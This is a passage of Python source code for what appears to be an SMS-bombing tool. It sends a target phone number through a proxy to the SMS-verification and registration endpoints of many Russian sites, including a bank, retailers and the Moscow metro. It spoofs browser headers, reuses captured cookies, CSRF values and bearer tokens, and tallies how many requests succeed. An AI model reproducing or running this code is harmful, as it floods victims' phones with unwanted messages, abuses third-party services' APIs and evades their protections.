sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F103.0.5060.134%20Safari%2F537.36%20OPR%2F89.0.4447.104; _ym_isad=1; _ym_visorc=w; __zzat129=MDA0dBA=Fz2+aQ==; cfids129=; geo_detect_url=www; geo_detect=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%A6%D0%B5%D0%BD%D1%82%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3; geo_detect_coords=55.755787%2C37.617634; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.raiffeisen.ru%2Fretail%2Fcards%2Fdebit%2Fcashback-card%2F%23ccform-form',
                        'DNT': '1',
                        'Host': 'oapi.raiffeisen.ru',
                        'Origin': 'https://www.raiffeisen.ru',
                        'Referer': 'https://www.raiffeisen.ru/retail/cards/debit/cashback-card/',
                        'sec-ch-ua': '"Opera GX";v="89", "Chromium";v="103", "_Not:A-Brand";v="24"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'Sec-Fetch-Dest': 'empty',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Site': 'same-site',
                        'User-Agent': user
                    }

                    payload = {"number": phone}

                    await session.post('https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code/sms', json=payload,
                                  headers=header, proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'accept': 'application/json, text/javascript, */*; q=0.01',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'fr-FR,fr',
                        'content-length': '287',
                        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'cookie': 'city=%D0%A3%D1%84%D0%B0; city_auto=%D0%A3%D1%84%D0%B0; PHPSESSID=mHhFwlKgOEIOv3TABmGqw4MT5LcG1ACD; BITRIX_SM_GUEST_ID=4508493; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A2%2C%22EXPIRE%22%3A1680901140%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; city_checked=true; BITRIX_SM_LAST_VISIT=07.04.2023%2001%3A25%3A56',
                        'origin': 'https://madyart.ru',
                        'referer': 'https://madyart.ru/reg/',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': user,
                        'x-requested-with': 'XMLHttpRequest'
                    }

                    payload = {
                        'wct_reg_fio': 'Пупкин',
                        'wct_reg_fio2': 'Василий',
                        'wct_reg_phone': madyart,
                        'wct_reg_ch': 'Y',
                        'wct_reg_1': '',
                        'wct_reg_2': '',
                        'wct_reg_3': '1',
                        'USER_PHONE': '7',
                        'USER_PHONE2': '',
                        'LOGIN1': '071',
                        'LOGIN2': '072',
                        'wc_phone_psw': 'sdfgwse5rgfdzvbsedf',
                        'wc_phone_psw2': 'sdfgwse5rgfdzvbsedf'
                    }

                    await session.post('https://madyart.ru/local/aut.php', data=payload, headers=header,
                                       proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'Accept': 'application/json, text/plain, */*',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'fr-FR,fr',
                        'Connection': 'keep-alive',
                        'Content-Length': '673',
                        'Content-Type': 'application/json;charset=UTF-8',
                        'Host': 'admin.growfood.pro',
                        'Origin': 'https://growfood.pro',
                        'Referer': 'https://growfood.pro/',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'Sec-Fetch-Dest': 'empty',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Site': 'same-site',
                        'User-Agent': user
                    }

                    payload = {
                        "analyticalData":{
                            "cookie":{
                                "new_site":"new",
                                "_ga":"GA1.2.330582126.1680820262",
                                "_ym_uid":"16808202623003063882",
                                "default_city":"msk",
                                "landingUpdateDefaultCity":"msk",
                                "_efst":"ba657a5e9ce612ea91edd7442b7234b6509f0f4ce19abe517f66a024931a8966",
                                "city_confirmed":"true"
                            },
                            "utm":{},
                            "referrer":None,
                            "host":"growfood.pro"
                        },
                        "client":{
                            "phone":growfood,
                            "cityId":2
                        }
                    }

                    await session.post('https://admin.growfood.pro/api/personal-cabinet/v2_0/authentication/send-sms',
                                       json=payload, headers=header, proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'accept': 'application/json',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'en-US,en;q=0.9',
                        'baggage': 'sentry-environment=prod-ru,sentry-public_key=dd1d902e97bb41b2a74f1b3085ae7b90,sentry-trace_id=355c468a4ec348ab85785e9e92a58cfb,sentry-sample_rate=0.3',
                        'content-type': 'application/json',
                        'cookie': 'anonymous_user_cart=; anonymous_user_last_viewed=; anonymous_user_wishlist=; anonymous_user_city=; COOKIE-BEARER=eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJ1MTYwMjcyNjUyNjciLCJhdXRob3JpdGllcyI6IlJPTEVfQU5PTllNT1VTIiwic2l0ZUlkIjoic3RvcmVNb2JpbGVSVSIsImlhdCI6MTY4MDgyMDMzOCwiZXhwIjoxNjgwOTA2NzM4fQ.tuqMdHyWy6hxAZk0Al6dgRhXgvi2J1XRRVLo6FWmrfadNLj1MMXp08qZC0v0_UFnIApiWCy_WsahOMcVKpaXag; JSESSIONID=p9Ds3HDO1Z05vgqLYvhL-HCyJhM_.prod-wru-a-02; language=ru-RU; cityDetected=true; ssaid=2be0dd40-d4cb-11ed-b05c-cdbb5369c5dd; cityGuessed=true; iap.uid=8f1c74fadf664bc2824c384bfa536f86; __tld__=null',
                        'dnt': '1',
                        'referer': 'https://www.letu.ru/',
                        'sec-ch-ua': '"Not?A_Brand";v="99", "Opera GX";v="97", "Chromium";v="111"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'sentry-trace': '355c468a4ec348ab85785e9e92a58cfb-903e19859104a2cb-1',
                        'user-agent': user,
                        'x-promo-msg': '8CDHp8P8LUWUlktA6uNgTw'
                    }

                    await session.get(
                        'https://www.letu.ru/s/api/user/account/v1/verifications/phone?pushSite='
                        f'storeMobileRU&phone=%2B7+%28{phone[1]}{phone[2]}{phone[3]}%29+{phone[4]}{phone[5]}{phone[6]}-'
                        f'{phone[7]}{phone[8]}-{phone[9]}{phone[10]}', headers=header, proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()

                    header = {
                        'accept': 'application/json',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'en-US,en;q=0.9',
                        'baggage': 'sentry-environment=prod-ru,sentry-public_key=dd1d902e97bb41b2a74f1b3085ae7b90,sentry-trace_id=355c468a4ec348ab85785e9e92a58cfb,sentry-sample_rate=0.3',
                        'content-length': '49',
                        'content-type': 'application/json',
                        'cookie': 'anonymous_user_cart=; anonymous_user_last_viewed=; anonymous_user_wishlist=; anonymous_user_city=; COOKIE-BEARER=eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJ1MTYwMjcyNjUyNjciLCJhdXRob3JpdGllcyI6IlJPTEVfQU5PTllNT1VTIiwic2l0ZUlkIjoic3RvcmVNb2JpbGVSVSIsImlhdCI6MTY4MDgyMDMzOCwiZXhwIjoxNjgwOTA2NzM4fQ.tuqMdHyWy6hxAZk0Al6dgRhXgvi2J1XRRVLo6FWmrfadNLj1MMXp08qZC0v0_UFnIApiWCy_WsahOMcVKpaXag; JSESSIONID=p9Ds3HDO1Z05vgqLYvhL-HCyJhM_.prod-wru-a-02; language=ru-RU; cityDetected=true; ssaid=2be0dd40-d4cb-11ed-b05c-cdbb5369c5dd; cityGuessed=true; iap.uid=8f1c74fadf664bc2824c384bfa536f86; __tld__=null',
                        'dnt': '1',
                        'origin': 'https://www.letu.ru',
                        'referer': 'https://www.letu.ru/',
                        'sec-ch-ua': '"Not?A_Brand";v="99", "Opera GX";v="97", "Chromium";v="111"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'sentry-trace': '355c468a4ec348ab85785e9e92a58cfb-98221c61647946d4-1',
                        'user-agent': user,
                        'x-promo-msg': '8CDHp8P8LUWUlktA6uNgTw'
                    }

                    payload = {
                        "captcha": "",
                        "phoneNumber": letu
                    }

                    await session.post(
                        f'https://www.letu.ru/s/api/user/account/v1/confirmations/phone?pushSite=storeMobileRU',
                        json=payload, headers=header, proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'accept': '*/*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'en-US,en;q=0.9',
                        'bx-ajax': 'true',
                        'content-length': '100',
                        'content-type': 'application/x-www-form-urlencoded',
                        'cookie': 'PHPSESSID=eso4zO8GovaXYtCeoGZs3zkBiXxrt6gB; BITRIX_SM_SALE_UID=53784612; BITRIX_SM_EVRAZ_CURRENT_LOC_ID=92; BITRIX_SM_EVRAZ_SEND_GEO_LOCATION_REQUEST=Y; operator=0; authorization=0; BITRIX_SM_EVRAZ_LAST_IP_V2=194.32.122.23; BITRIX_SM_EVRAZ_LOC_ID=92; BITRIX_SM_EVRAZ_LOC_CITY_NAME=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; BITRIX_SM_EVRAZ_CITY=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0',
                        'dnt': '1',
                        'origin': 'https://evraz.market',
                        'referer': 'https://evraz.market/',
                        'sec-ch-ua': '"Not?A_Brand";v="99", "Opera GX";v="97", "Chromium";v="111"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': user,
                        'x-bitrix-csrf-token': 'ce46266c9ca3de6414e13d163615c827',
                        'x-bitrix-site-id': 's1'
                    }

                    payload = {
                        'userPhone': letu,
                        'captchaCode': '',
                        'captchaWord': '',
                        'sessid': 'ce46266c9ca3de6414e13d163615c827'
                    }

                    await session.post(
                        'https://spb.evraz.market/bitrix/services/main/ajax.php?action=evraz%3Amain.api.auth.sendsms',
                        data=payload, headers=header, proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'accept': '*/*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'en-US,en;q=0.9',
                        'content-length': '164',
                        'content-type': 'application/json; charset=UTF-8',
                        'cookie': 'route=1680820917.106.1118.829394|4d33fc6b928f7f8ef63e5c30cfa97296; WELCOMESESSID=igv6e0v73vouvqliq8rp4o8qhv; _user_location=3eaf80b99b78f648b2ef3159af22d67d1551ea0424141f70965891ede650e8e3a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_user_location%22%3Bi%3A1%3Bs%3A1%3A%221%22%3B%7D; utm=4bbcd7bfd0c9102467242ca243ed5d844d77cb0e29dba11fbac5c81df541132ea%3A2%3A%7Bi%3A0%3Bs%3A3%3A%22utm%22%3Bi%3A1%3Bs%3A96%3A%22%7B%22utm_source%22%3A%22Direct%22%2C%22utm_medium%22%3Anull%2C%22utm_campaign%22%3Anull%2C%22utm_term%22%3Anull%2C%22utm_content%22%3Anull%7D%22%3B%7D; JivoSiteLoaded=1; cf_chl_2=6ed16fa4ee7406c; cf_clearance=On.4KfrVBSBFmzK4HeBq8wWBoWXReX54BO4lGvGspG8-1680820926-0-150',
                        'dnt': '1',
                        'origin': 'https://abc.ru',
                        'referer': 'https://abc.ru/registration/',
                        'sec-ch-ua': '"Not?A_Brand";v="99", "Opera GX";v="97", "Chromium";v="111"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': user
                    }

                    payload = {"phone": "+" + phone, "country_id": 1, "scenario": "registration",
                               "_csrf": "oqqL7n8CPs-K8TyRRe11rFxa0lUmFcqXKMx-KWjt6-mQ_f2DLWVR9r2EW_t3rCHraQ2BYWd2g8RwvQ1cKaaviw=="}

                    await session.post('https://abc.ru/clientapi/v1/user/phone-sms/', json=payload, headers=header,
                                       proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'accept': 'application/json',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'fr-FR,fr',
                        'content-length': '505',
                        'content-type': 'application/json',
                        'cookie': '.AspNetCore.Culture=c%3Dru%7Cuic%3Dru',
                        'origin': 'https://auth.mosmetro.ru',
                        'referer': 'https://auth.mosmetro.ru/signin?ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Df1dac608-dd35-4717-8cbb-18e2f7a1d522%26redirect_uri%3Dhttps%253A%252F%252Flk.mosmetro.ru%252Fexternal-auth%26response_type%3Dcode%26scope%3Dopenid%2520offline_access%2520nbs.ppa%26code_challenge%3Df3L8XTKxMOIGSvyONKNJ6baxDFWCTaB5uFw_7RU6LP8%26code_challenge_method%3DS256%26nonce%3D638031215106710169.NTFlZmI3NTAtYjZhZS00ZTBlLWIzOWItNzg3ZmQxNzQ1NmVhYzcwMGM1ZTQtNTViMi00ZDE3LTk3NTgtNTEzMThkYTg5YzRi%26state%3Dfc7kxm178qekphufyqkq0k%26ui_locales%3Dru%26acr_values%3Dtheme%253Alight&providers=%5B%0A%20%20%22yandex%22,%0A%20%20%22apple%22,%0A%20%20%22sudir%22,%0A%20%20%22google%22,%0A%20%20%22vkontakte%22,%0A%20%20%22local%22%0A%5D',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': user
                    }

                    payload = {"login": phone,
                               "returnUrl": "/connect/authorize/callback?client_id=f1dac608-dd35-4717-8cbb-18e2f7a1d522&redirect_uri=https%3A%2F%2Flk.mosmetro.ru%2Fexternal-auth&response_type=code&scope=openid%20offline_access%20nbs.ppa&code_challenge=f3L8XTKxMOIGSvyONKNJ6baxDFWCTaB5uFw_7RU6LP8&code_challenge_method=S256&nonce=638031215106710169.NTFlZmI3NTAtYjZhZS00ZTBlLWIzOWItNzg3ZmQxNzQ1NmVhYzcwMGM1ZTQtNTViMi00ZDE3LTk3NTgtNTEzMThkYTg5YzRi&state=fc7kxm178qekphufyqkq0k&ui_locales=ru&acr_values=theme%3Alight"}

                    await session.post('https://auth.mosmetro.ru/api/auth/login/sms', json=payload, headers=header, 
                                       proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'accept': '*/*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'fr-FR,fr',
                        'content-length': '117',
                        'content-type': 'application/json',
                        'cookie': 'utid=uRELsmNka8x+akk1EoeDAg==',
                        'origin': 'https://spb.uteka.ru',
                        'platform': 'Desktop',
                        'referer': 'https://spb.uteka.ru/',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': user,
                        'version': 'b835b033'
                    }

                    payload = {"jsonrpc": "2.0", "id": 8, "method": "auth.GetCode",
                               "params": {"phone": phone[1:], "mustExist": False, "sendRealSms": True}}

                    await session.post('https://spb.uteka.ru/rpc/?method=auth.GetCode', json=payload, headers=header, 
                                       proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'accept': '*/*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'fr-FR,fr',
                        'authorization': 'Bearer 5mV0xfl6pp5yCOKcwOTy1bY6-V8wPtwn',
                        'content-length': '220',
                        'content-type': 'application/json',
                        'origin': 'https://elementaree.ru',
                        'referer': 'https://elementaree.ru/',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-site',
                        'user-agent': user
                    }

                    payload = {"operationName": "phoneVerification", "variables": {"phone": phone},
                               "query": "mutation phoneVerification($phone: String!) {\n  phoneVerification(phone: $phone) {\n    success\n    interval\n    __typename\n  }\n}\n"}

                    await session.post('https://api-new.elementaree.ru/graphql', json=payload, headers=header, 
                                       proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'Accept': 'application/json, text/plain, */*',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'fr-FR,fr',
                        'Client': 'angular_web_0.0.2',
                        'Connection': 'keep-alive',
                        'Content-Length': '82',
                        'Content-Type': 'text/plain',
                        'Cookie': 'qrator_msid=1667526234.775.XKeTKEPsW4ov4g4D-6qn2qar0j8pjc4gatudrriv26nb4dhqp; Utk_DvcGuid=50e83205-9a55-845c-3d3e-363cdc1925e4; Utk_SessionToken=3928A6E837779529C395A626B52E49E2; User_Agent=Mozilla%2F5.0%20(Macintosh%3B%20Intel%20Mac%20OS%20X%2012_2_1)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F106.0.0.0%20Safari%2F537.36; Is_Search_Bot=false; Utk_MrkGrpTkn=1FCF76D07C49A5ED62F64683C21656E9; agree_with_cookie=true; Utk_SssTkn=3928A6E837779529C395A626B52E49E2',
                        'Deviceid': '50e83205-9a55-845c-3d3e-363cdc1925e4',
                        'Host': 'moscow.online.lenta.com',
                        'Origin': 'https://moscow.online.lenta.com',
                        'Referer': 'https://moscow.online.lenta.com/',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'Sec-Fetch-Dest': 'empty',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Site': 'same-origin',
                        'SessionToken': '3928A6E837779529C395A626B52E49E2',
                        'User-Agent': user,
                        'x-domain': 'moscow',
                        'x-retail-brand': 'lo'
                    }

                    payload = {"method": "authCodeSend", "params": {"phone": phone}, "jsonrpc": "2.0", "id": 12}

                    await session.post('https://moscow.online.lenta.com/jrpc', json=payload, headers=header, proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'Accept': 'application/json, text/plain, */*',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'fr-FR,fr',
                        'access_token': 'eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI2OTZjMWI5Zi0xZzQ1LTQ1OWEtYmVhNC0xMTEwNjhmYWNkYTgiLCJpYXQiOjE2Njc1MjY0NzEsInN1YiI6ImNoZWNrbWFpbF91c2VyIiwibGV2ZWwiOjIwLCJpc3MiOiJBdWNoYW4ucnUiLCJleHAiOjE2NzUzMDI0NzF9.9Fgzk9RrWW82n5F2uUggsAyBuZHc_fqWZp-GOxph5qk',
                        'Connection': 'keep-alive',
                        'Cookie': 'qrator_jsr=1667526415.893.MfERRj629UrSfHpf-8rtud06upbosderhvl5g1ef3390ea0d5-00; qrator_jsid=1667526415.893.MfERRj629UrSfHpf-jm7luqtsup8el3ol2j60phv7fkan9i6u; qrator_ssid=1667526416.258.OYUlKh0aP6DY18Jw-u4fv9j20mlns9csfk011vboa84jsc382; isEreceiptedPopupShown_=true; ab_test_popup_delivery=test_group; motopopupforeveryone=1; isAddressPopupShown_=true; region_id=1; merchant_ID_=1; methodDelivery_=1; _GASHOP=001_Mitishchi; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D; tmr_lvid=1af3ad7f44323452a463acb0f7f4e6ba; tmr_lvidTS=1667526432573; _ym_uid=166752643344618027; _ym_d=1667526433; kameleoonVisitorCode=_js_dq2tzq3u66bvzpow; rrpvid=149419622442899; _userGUID=0:la1u6mdr:Ks5DPIpdJXdMpsJ2bfqnyt6SX4WcJDpg; dSesn=36d4984e-ef17-39b9-6c97-f9b8134436c1; _dvs=0:la1u6mdr:OwFvRPS2gUvDudZhy0uiDpFn6wuQj3Eh; _ym_isad=2; rcuid=63646f12e2746a93f2420567; haveChat=true; tmr_detect=0%7C1667526435285; device_id=206053908846.45267; tmr_reqNum=5',
                        'Host': 'www.auchan.ru',
                        'phone': phone,
                        'Referer': 'https://www.auchan.ru/auth/',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'Sec-Fetch-Dest': 'empty',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Site': 'same-origin',
                        'source': '4',
                        'User-Agent': user
                    }

                    await session.get('https://www.auchan.ru/v1/cmd/clientprofile/checkphone', headers=header,
                                 proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'accept': '*/*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'fr-FR,fr',
                        'content-length': '141',
                        'content-type': 'application/json',
                        'cookie': '_ga=GA1.2.2080011146.1667526756; _gid=GA1.2.846099629.1667526756; _gat=1; _ym_uid=16675267561046031971; _ym_d=1667526756; _ym_visorc=w; _ym_isad=2; XSRF-TOKEN=eyJpdiI6ImZZTjluOFkrNnZZcGp2ZmN1ckQ2aWc9PSIsInZhbHVlIjoibVRsUDFwb0FlMGt4U2p3dW02UXRLb0o4U3hyNTZIeWJPNWxGbWJhWlhHWm1NK05RaWtsbjhOUWM2VFVrcmo1UWV4eHBzMWJEbnh2OXRJUVBObmFvU2c9PSIsIm1hYyI6ImQ3YmY0ZjI5M2U5ODVkZDNkMzY4MjRiZDBiYjMzNDA0NzZiMTIzZjVmODZiMzA4NmU0N2U0ZmVhYmQ5MWIzNjAifQ%3D%3D; victorialk_session=eyJpdiI6Im02RnkzdThaZmI0RTJZVktJZWt0UkE9PSIsInZhbHVlIjoiWVJSd3g0WFV1bHFvcTFCVFFWTmtXWElKNFBmeHBreWZRMEIxNzhhNUxlSjFybW4wS1VqSU5ZQlFqVEt2V2Y0RVVsUnpyZzZqWTJXUmtoZzRkRlladEE9PSIsIm1hYyI6ImE4NDQ2NDUyMmE2ODliMzNiM2ExZmFjODE1MWI1ZTZjNWNlNmQ4N2NlODU0OWYxMjY3MzU2YWYyODAwYzk4NGUifQ%3D%3D',
                        'origin': 'https://lk.victoria-group.ru',
                        'referer': 'https://lk.victoria-group.ru/',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': user,
                        'x-csrf-token': 'FSP8p7pYb7YwNMG71KtkOOsC5WSJpcUwNohCfKHA'
                    }

                    payload = "{\"MobilePhone\":\"+" + phone + "\",\"CardNumber\":null,\"AgreeToTerms\":1,\"AllowNotification\":0,\"DeviceId\":\"gl3llll8mih00hxy1xg6j23c\"}"

                    await session.post(
                        'https://lk.victoria-group.ru/identity/registration', json=payload, headers=header,
                        proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'accept': '*/*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'fr-FR,fr',
                        'content-length': '0',
                        'cookie': '_cfuvid=niRXx8FEscDdwEZcbQBkuUsNaKKENY758SgtDB57zoA-1667585854597-0-604800000; favoriteProducts=%5B%5D; CITY_CONFIRM=true; without_critical=1; reuserid=d2314c12-cce6-46e1-8955-1173e60338f7; O_ZONE_ALIAS=msk; O_CITY_ID=133; SETCITY=133; dtCookie=v_4_srv_1_sn_689C90C537E1DB01B95EB82A7DEBB5E6_perc_100000_ol_0_mul_1_app-3Aea7c4b59f27d43eb_1; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D; SITE_SESSID=og4i452ghf6iv1of9c8r00eqr0; branch=K; cf_clearance=e2a2205501dafb3bf87873b2124c0738bea5693a-1667590180-0-150; searchPlaceholder=%25D0%25A3%25D1%2586%25D0%25B5%25D0%25BD%25D0%25B5%25D0%25BD%25D0%25BD%25D1%258B%25D0%25B5%2520%25D1%2581%25D0%25BC%25D0%25B0%25D1%2580%25D1%2582%25D1%2584%25D0%25BE%25D0%25BD%25D1%258B; __cf_bm=aBYWEoj8cSOBrcje9oCzroNpBVWTD0qYy_avyt1ea2g-1667590182-0-AXB6r6+dn1ulF7849ULVkAdvlQwYGsG9o4/7Hke1yzaI5xD+kHzm18NsHRU8UJFr6pkbrkJ8T3F8ZEdq0ZzXRfOjH8NTmifBlC1B+icPKgWuyiBpmhdLKZPy669t6TZkTocJNii2TX87IZjN0ER0Tcu9YAtHYnErIk5enhaa9K7lOL6VPE4p+wtDuJkSx7rTOA==',
                        'origin': 'https://www.svyaznoy.ru',
                        'referer': 'https://www.svyaznoy.ru/',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': user,
                        'x-requested-with': 'XMLHttpRequest'
                    }

                    await session.post(f'https://www.svyaznoy.ru/api/v2/sms-verification-code/{phone[1:]}', headers=header,
                                  proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'accept': '*/*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'fr-FR,fr',
                        'cache-control-version': '527d4952171b0b0f1b75544d1b090b09091b0a02010e02010e021b7c766f',
                        'content-length': '38',
                        'content-type': 'application/json',
                        'cookie': 'referrer_first=dir; referrer_hist=dir; referrer=; accept_language=ru; abst=test_a; vid=b13a31d4-2feb-49e0-8f7d-a33aface1476; rm=758e2f3b6d1c747c776f37d331f76b8d495a65cbf5c3d910a30406cf76ecdbfa7f187a8a9223f69f6d26e1b75398615fbbb5cda084fa43362bb7598246bea249; sid=g0v+9sLViCLWl3Koz3ws/AwH; ENVID=production-a|Y2VvQ',
                        'origin': 'https://www.onetwotrip.com',
                        'referer': 'https://www.onetwotrip.com/ru/p/account',
